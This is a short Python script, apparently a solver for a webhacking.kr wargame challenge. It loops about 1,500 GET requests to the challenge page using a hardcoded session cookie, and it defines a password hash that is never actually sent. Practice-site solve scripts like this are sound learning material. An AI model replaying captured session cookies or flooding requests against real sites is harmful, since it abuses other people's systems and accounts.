
import requests

url = "http://webhacking.kr/challenge/bonus/bonus-6/l4.php"
for i in range(1,1500):
	params={
		"password":"83882a2a3bf4fff4ce29c3797af16308"
	}

	headers = {
		"Cookie": "oldzombie=1; PHPSESSID=8aa8b01919b86d9a80f524a71c187ce9",
		"Host": "webhacking.kr"
	}

	req = requests.get(url,headers=headers)
	print req.content